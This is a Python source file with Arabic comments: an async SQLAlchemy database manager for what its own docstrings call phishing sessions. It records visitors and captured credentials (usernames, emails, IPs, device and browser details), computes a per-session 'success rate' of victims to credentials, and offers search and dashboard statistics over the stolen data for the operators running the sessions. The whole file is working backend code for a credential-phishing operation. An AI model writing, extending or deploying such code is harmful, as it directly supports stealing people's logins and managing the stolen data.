"""
⚡ مدير العمليات المتقدم لقاعدة البيانات
يدعم العمليات المعقدة، التخزين المؤقت، والاستعلامات المحسنة
"""

import asyncio
import logging
from datetime import datetime, timedelta
from typing import Optional, List, Dict, Any, Union
from sqlalchemy import select, update, delete, func, and_, or_, desc, asc
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy.orm import selectinload, joinedload

from .models import User, Session, CapturedData, SystemLog, UserPermission, SessionStats
from .connection import get_session
from ..config import settings

logger = logging.getLogger(__name__)

class DatabaseManager:
    """مدير قاعدة البيانات المتقدم مع عمليات محسنة"""
    
    def __init__(self):
        self._cache = {}  # تخزين مؤقت بسيط
        self._cache_ttl = 300  # 5 دقائق
    
    # ===========================================
    # عمليات المستخدمين
    # ===========================================
    
    async def get_user_by_id(self, user_id: int) -> Optional[User]:
        """الحصول على مستخدم بمعرفه"""
        cache_key = f"user_{user_id}"
        
        # فحص التخزين المؤقت
        cached_user = self._get_from_cache(cache_key)
        if cached_user:
            return cached_user
        
        async with get_session() as session:
            stmt = select(User).where(User.user_id == user_id)
            result = await session.execute(stmt)
            user = result.scalar_one_or_none()
            
            if user:
                self._set_cache(cache_key, user)
            
            return user
    
    async def create_user(self, user_data: Dict[str, Any]) -> User:
        """إنشاء مستخدم جديد"""
        async with get_session() as session:
            user = User(**user_data)
            session.add(user)
            await session.commit()
            await session.refresh(user)
            
            # تسجيل في السجل
            await self.log_event(
                user_id=user.user_id,
                event_type="user",
                event_action="created",
                event_description=f"تم إنشاء مستخدم جديد: {user.username or user.first_name}"
            )
            
            # إزالة من التخزين المؤقت
            self._invalidate_cache(f"user_{user.user_id}")
            
            return user
    
    async def update_user(self, user_id: int, updates: Dict[str, Any]) -> Optional[User]:
        """تحديث بيانات المستخدم"""
        async with get_session() as session:
            stmt = select(User).where(User.user_id == user_id)
            result = await session.execute(stmt)
            user = result.scalar_one_or_none()
            
            if not user:
                return None
            
            # تحديث البيانات
            for key, value in updates.items():
                if hasattr(user, key):
                    setattr(user, key, value)
            
            user.updated_at = datetime.utcnow()
            await session.commit()
            await session.refresh(user)
            
            # تسجيل في السجل
            await self.log_event(
                user_id=user_id,
                event_type="user",
                event_action="updated",
                event_description=f"تم تحديث بيانات المستخدم",
                metadata=updates
            )
            
            # إزالة من التخزين المؤقت
            self._invalidate_cache(f"user_{user_id}")
            
            return user
    
    async def update_user_last_seen(self, user_id: int) -> None:
        """تحديث آخر ظهور للمستخدم"""
        async with get_session() as session:
            stmt = (
                update(User)
                .where(User.user_id == user_id)
                .values(last_seen=datetime.utcnow())
            )
            await session.execute(stmt)
            await session.commit()
            
            # إزالة من التخزين المؤقت
            self._invalidate_cache(f"user_{user_id}")
    
    async def get_users_by_role(self, role: str, active_only: bool = True) -> List[User]:
        """الحصول على المستخدمين حسب الدور"""
        async with get_session() as session:
            stmt = select(User).where(User.role == role)
            
            if active_only:
                stmt = stmt.where(and_(User.is_active == True, User.is_banned == False))
            
            result = await session.execute(stmt)
            return list(result.scalars().all())
    
    async def ban_user(self, user_id: int, ban_reason: str, banned_by: int) -> bool:
        """حظر مستخدم"""
        async with get_session() as session:
            stmt = (
                update(User)
                .where(User.user_id == user_id)
                .values(
                    is_banned=True,
                    ban_reason=ban_reason,
                    updated_at=datetime.utcnow()
                )
            )
            result = await session.execute(stmt)
            await session.commit()
            
            if result.rowcount > 0:
                await self.log_event(
                    user_id=banned_by,
                    event_type="admin",
                    event_action="ban_user",
                    event_description=f"تم حظر المستخدم {user_id}",
                    metadata={"banned_user": user_id, "reason": ban_reason}
                )
                
                # إزالة من التخزين المؤقت
                self._invalidate_cache(f"user_{user_id}")
                return True
            
            return False
    
    # ===========================================
    # عمليات الجلسات
    # ===========================================
    
    async def create_session(self, session_data: Dict[str, Any]) -> Session:
        """إنشاء جلسة تصيد جديدة"""
        async with get_session() as db_session:
            session_obj = Session(**session_data)
            db_session.add(session_obj)
            await db_session.commit()
            await db_session.refresh(session_obj)
            
            # تحديث عداد الجلسات للمستخدم
            await self._increment_user_sessions(session_obj.user_id)
            
            # تسجيل في السجل
            await self.log_event(
                user_id=session_obj.user_id,
                event_type="session",
                event_action="created",
                event_description=f"تم إنشاء جلسة جديدة: {session_obj.site_type}",
                session_id=session_obj.session_id
            )
            
            return session_obj
    
    async def get_session_by_id(self, session_id: str) -> Optional[Session]:
        """الحصول على جلسة بمعرفها"""
        async with get_session() as session:
            stmt = (
                select(Session)
                .options(selectinload(Session.user), selectinload(Session.captured_data))
                .where(Session.session_id == session_id)
            )
            result = await session.execute(stmt)
            return result.scalar_one_or_none()
    
    async def get_user_sessions(
        self, 
        user_id: int, 
        status: Optional[str] = None,
        limit: int = 50,
        offset: int = 0
    ) -> List[Session]:
        """الحصول على جلسات المستخدم"""
        async with get_session() as session:
            stmt = (
                select(Session)
                .where(Session.user_id == user_id)
                .order_by(desc(Session.created_at))
                .limit(limit)
                .offset(offset)
            )
            
            if status:
                stmt = stmt.where(Session.status == status)
            
            result = await session.execute(stmt)
            return list(result.scalars().all())
    
    async def get_active_sessions(self) -> List[Session]:
        """الحصول على جميع الجلسات النشطة"""
        async with get_session() as session:
            stmt = (
                select(Session)
                .options(selectinload(Session.user))
                .where(Session.status.in_(["starting", "active"]))
                .order_by(desc(Session.started_at))
            )
            result = await session.execute(stmt)
            return list(result.scalars().all())
    
    async def update_session_status(
        self, 
        session_id: str, 
        status: str, 
        **kwargs
    ) -> bool:
        """تحديث حالة الجلسة"""
        updates = {"status": status, "updated_at": datetime.utcnow()}
        
        # إضافة وقت البداية أو النهاية حسب الحالة
        if status == "active" and "started_at" not in kwargs:
            updates["started_at"] = datetime.utcnow()
        elif status in ["stopped", "error"] and "stopped_at" not in kwargs:
            updates["stopped_at"] = datetime.utcnow()
        
        # إضافة التحديثات الإضافية
        updates.update(kwargs)
        
        async with get_session() as session:
            stmt = (
                update(Session)
                .where(Session.session_id == session_id)
                .values(**updates)
            )
            result = await session.execute(stmt)
            await session.commit()
            
            if result.rowcount > 0:
                # تسجيل في السجل
                stmt_select = select(Session).where(Session.session_id == session_id)
                result_select = await session.execute(stmt_select)
                session_obj = result_select.scalar_one_or_none()
                
                if session_obj:
                    await self.log_event(
                        user_id=session_obj.user_id,
                        event_type="session",
                        event_action="status_changed",
                        event_description=f"تم تغيير حالة الجلسة إلى: {status}",
                        session_id=session_id,
                        metadata={"new_status": status, "updates": kwargs}
                    )
                
                return True
            
            return False
    
    async def increment_session_visitors(self, session_id: str) -> None:
        """زيادة عداد زوار الجلسة"""
        async with get_session() as session:
            stmt = (
                update(Session)
                .where(Session.session_id == session_id)
                .values(
                    total_visitors=Session.total_visitors + 1,
                    updated_at=datetime.utcnow()
                )
            )
            await session.execute(stmt)
            await session.commit()
    
    async def increment_session_credentials(self, session_id: str) -> None:
        """زيادة عداد بيانات الاعتماد للجلسة"""
        async with get_session() as session:
            stmt = (
                update(Session)
                .where(Session.session_id == session_id)
                .values(
                    total_credentials=Session.total_credentials + 1,
                    updated_at=datetime.utcnow()
                )
            )
            await session.execute(stmt)
            await session.commit()
            
            # حساب معدل النجاح
            await self._calculate_session_success_rate(session_id)
    
    # ===========================================
    # عمليات البيانات المُلتقطة
    # ===========================================
    
    async def create_captured_data(self, data: Dict[str, Any]) -> CapturedData:
        """إنشاء بيانات مُلتقطة جديدة"""
        async with get_session() as session:
            captured = CapturedData(**data)
            session.add(captured)
            await session.commit()
            await session.refresh(captured)
            
            # تحديث عداد الجلسة
            await self.increment_session_credentials(captured.session_id)
            
            # تسجيل في السجل
            await self.log_event(
                event_type="capture",
                event_action="credentials_captured",
                event_description=f"تم التقاط بيانات جديدة من {captured.ip_address}",
                session_id=captured.session_id,
                ip_address=captured.ip_address,
                metadata={
                    "complete": captured.is_complete(),
                    "device": captured.device_type,
                    "browser": captured.browser
                }
            )
            
            return captured
    
    async def get_session_captured_data(
        self, 
        session_id: str,
        limit: int = 100,
        offset: int = 0
    ) -> List[CapturedData]:
        """الحصول على البيانات المُلتقطة لجلسة معينة"""
        async with get_session() as session:
            stmt = (
                select(CapturedData)
                .where(CapturedData.session_id == session_id)
                .order_by(desc(CapturedData.created_at))
                .limit(limit)
                .offset(offset)
            )
            result = await session.execute(stmt)
            return list(result.scalars().all())
    
    async def get_recent_captures(
        self, 
        hours: int = 24,
        limit: int = 50
    ) -> List[CapturedData]:
        """الحصول على أحدث البيانات المُلتقطة"""
        since = datetime.utcnow() - timedelta(hours=hours)
        
        async with get_session() as session:
            stmt = (
                select(CapturedData)
                .options(selectinload(CapturedData.session))
                .where(CapturedData.created_at >= since)
                .order_by(desc(CapturedData.created_at))
                .limit(limit)
            )
            result = await session.execute(stmt)
            return list(result.scalars().all())
    
    async def search_captured_data(
        self,
        query: str,
        search_fields: List[str] = None,
        limit: int = 50
    ) -> List[CapturedData]:
        """البحث في البيانات المُلتقطة"""
        if not search_fields:
            search_fields = ["ip_address", "country", "city", "username", "email"]
        
        async with get_session() as session:
            conditions = []
            
            for field in search_fields:
                if hasattr(CapturedData, field):
                    column = getattr(CapturedData, field)
                    conditions.append(column.ilike(f"%{query}%"))
            
            if conditions:
                stmt = (
                    select(CapturedData)
                    .options(selectinload(CapturedData.session))
                    .where(or_(*conditions))
                    .order_by(desc(CapturedData.created_at))
                    .limit(limit)
                )
                result = await session.execute(stmt)
                return list(result.scalars().all())
            
            return []
    
    # ===========================================
    # عمليات السجلات
    # ===========================================
    
    async def log_event(
        self,
        event_type: str,
        event_action: str,
        event_description: str = None,
        user_id: int = None,
        session_id: str = None,
        ip_address: str = None,
        user_agent: str = None,
        metadata: Dict[str, Any] = None,
        severity: str = "info"
    ) -> SystemLog:
        """تسجيل حدث في النظام"""
        async with get_session() as session:
            log = SystemLog(
                user_id=user_id,
                event_type=event_type,
                event_action=event_action,
                event_description=event_description,
                session_id=session_id,
                ip_address=ip_address,
                user_agent=user_agent,
                metadata=metadata,
                severity=severity
            )
            session.add(log)
            await session.commit()
            await session.refresh(log)
            
            return log
    
    async def get_system_logs(
        self,
        event_type: str = None,
        severity: str = None,
        user_id: int = None,
        hours: int = 24,
        limit: int = 100
    ) -> List[SystemLog]:
        """الحصول على سجلات النظام"""
        since = datetime.utcnow() - timedelta(hours=hours)
        
        async with get_session() as session:
            stmt = (
                select(SystemLog)
                .options(selectinload(SystemLog.user))
                .where(SystemLog.created_at >= since)
                .order_by(desc(SystemLog.created_at))
                .limit(limit)
            )
            
            if event_type:
                stmt = stmt.where(SystemLog.event_type == event_type)
            if severity:
                stmt = stmt.where(SystemLog.severity == severity)
            if user_id:
                stmt = stmt.where(SystemLog.user_id == user_id)
            
            result = await session.execute(stmt)
            return list(result.scalars().all())
    
    # ===========================================
    # إحصائيات وتقارير
    # ===========================================
    
    async def get_dashboard_stats(self) -> Dict[str, Any]:
        """الحصول على إحصائيات لوحة التحكم"""
        async with get_session() as session:
            # إحصائيات عامة
            total_users = await session.scalar(select(func.count(User.id)))
            active_sessions = await session.scalar(
                select(func.count(Session.id)).where(Session.status.in_(["starting", "active"]))
            )
            
            # إحصائيات اليوم
            today = datetime.utcnow().date()
            today_captures = await session.scalar(
                select(func.count(CapturedData.id))
                .where(func.date(CapturedData.created_at) == today)
            )
            
            # إحصائيات الأسبوع
            week_ago = datetime.utcnow() - timedelta(days=7)
            week_sessions = await session.scalar(
                select(func.count(Session.id))
                .where(Session.created_at >= week_ago)
            )
            
            # أحدث النشاطات
            recent_logs = await self.get_system_logs(hours=1, limit=5)
            
            return {
                "total_users": total_users,
                "active_sessions": active_sessions,
                "today_captures": today_captures,
                "week_sessions": week_sessions,
                "recent_activity": [log.to_dict() for log in recent_logs]
            }
    
    async def get_user_statistics(self, user_id: int) -> Dict[str, Any]:
        """الحصول على إحصائيات مستخدم معين"""
        async with get_session() as session:
            # عدد الجلسات
            total_sessions = await session.scalar(
                select(func.count(Session.id)).where(Session.user_id == user_id)
            )
            
            # الجلسات النشطة
            active_sessions = await session.scalar(
                select(func.count(Session.id))
                .where(and_(
                    Session.user_id == user_id,
                    Session.status.in_(["starting", "active"])
                ))
            )
            
            # إجمالي البيانات المُلتقطة
            total_captures = await session.scalar(
                select(func.count(CapturedData.id))
                .join(Session)
                .where(Session.user_id == user_id)
            )
            
            # آخر نشاط
            last_session = await session.scalar(
                select(Session.created_at)
                .where(Session.user_id == user_id)
                .order_by(desc(Session.created_at))
            )
            
            return {
                "total_sessions": total_sessions,
                "active_sessions": active_sessions,
                "total_captures": total_captures,
                "last_activity": last_session.isoformat() if last_session else None
            }
    
    # ===========================================
    # دوال مساعدة خاصة
    # ===========================================
    
    async def _increment_user_sessions(self, user_id: int) -> None:
        """زيادة عداد جلسات المستخدم"""
        async with get_session() as session:
            stmt = (
                update(User)
                .where(User.user_id == user_id)
                .values(total_sessions=User.total_sessions + 1)
            )
            await session.execute(stmt)
            await session.commit()
    
    async def _calculate_session_success_rate(self, session_id: str) -> None:
        """حساب معدل نجاح الجلسة"""
        async with get_session() as session:
            # الحصول على إحصائيات الجلسة
            session_data = await session.scalar(
                select(Session).where(Session.session_id == session_id)
            )
            
            if session_data and session_data.total_visitors > 0:
                success_rate = (session_data.total_credentials / session_data.total_visitors) * 100
                
                stmt = (
                    update(Session)
                    .where(Session.session_id == session_id)
                    .values(success_rate=f"{success_rate:.1f}%")
                )
                await session.execute(stmt)
                await session.commit()
    
    def _get_from_cache(self, key: str) -> Any:
        """الحصول على قيمة من التخزين المؤقت"""
        if key in self._cache:
            data, timestamp = self._cache[key]
            if datetime.utcnow().timestamp() - timestamp < self._cache_ttl:
                return data
            else:
                del self._cache[key]
        return None
    
    def _set_cache(self, key: str, value: Any) -> None:
        """حفظ قيمة في التخزين المؤقت"""
        self._cache[key] = (value, datetime.utcnow().timestamp())
    
    def _invalidate_cache(self, key: str) -> None:
        """إزالة قيمة من التخزين المؤقت"""
        if key in self._cache:
            del self._cache[key]
    
    async def cleanup_old_data(self, days: int = 30) -> Dict[str, int]:
        """تنظيف البيانات القديمة"""
        cutoff_date = datetime.utcnow() - timedelta(days=days)
        
        async with get_session() as session:
            # حذف السجلات القديمة
            deleted_logs = await session.execute(
                delete(SystemLog).where(SystemLog.created_at < cutoff_date)
            )
            
            # حذف الجلسات القديمة المتوقفة
            deleted_sessions = await session.execute(
                delete(Session).where(
                    and_(
                        Session.status == "stopped",
                        Session.created_at < cutoff_date
                    )
                )
            )
            
            await session.commit()
            
            return {
                "deleted_logs": deleted_logs.rowcount,
                "deleted_sessions": deleted_sessions.rowcount
            }

# مثيل مدير قاعدة البيانات العام
db_manager = DatabaseManager()